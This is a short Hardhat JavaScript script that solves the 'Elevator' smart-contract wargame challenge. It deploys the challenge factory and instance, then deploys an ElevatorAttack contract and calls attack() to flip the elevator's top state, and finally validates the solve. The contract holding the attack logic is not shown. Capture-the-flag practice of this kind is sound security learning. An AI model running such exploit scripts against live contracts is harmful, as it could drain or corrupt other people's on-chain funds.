const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    console.log("\n[0] original owner: ", owner.address);
    console.log("[0] player: ", player.address);

    console.log("\n[1] deploy ElevatorFactory");
    const Factory = await ethers.getContractFactory("ElevatorFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();
    console.log("---- ElevatorFactory address: ", factory.address);

    console.log("\n[2] create a Elevator instance");
    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const elevator = await ethers.getContractAt("Elevator", instance_address, owner);
    console.log("---- Elevator address: ", elevator.address);
    console.log("");
    console.log("---- Elevator top: ", await elevator.top());
    console.log("---- Elevator floor: ", await elevator.floor());

    console.log("\n[3] deploy a ElevatorAttack contract");
    const Attack = await ethers.getContractFactory("ElevatorAttack");
    const attack = await Attack.connect(player).deploy();
    await attack.deployed();
    console.log("---- Attack address:", attack.address);

    console.log("\n[4] Attack");
    await attack.attack(elevator.address);
    console.log("");
    console.log("---- Elevator top: ", await elevator.top());
    console.log("---- Elevator floor: ", await elevator.floor());

    console.log("\n[5] validate solved");
    const res = await factory.validateInstance(elevator.address, player.address);

    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

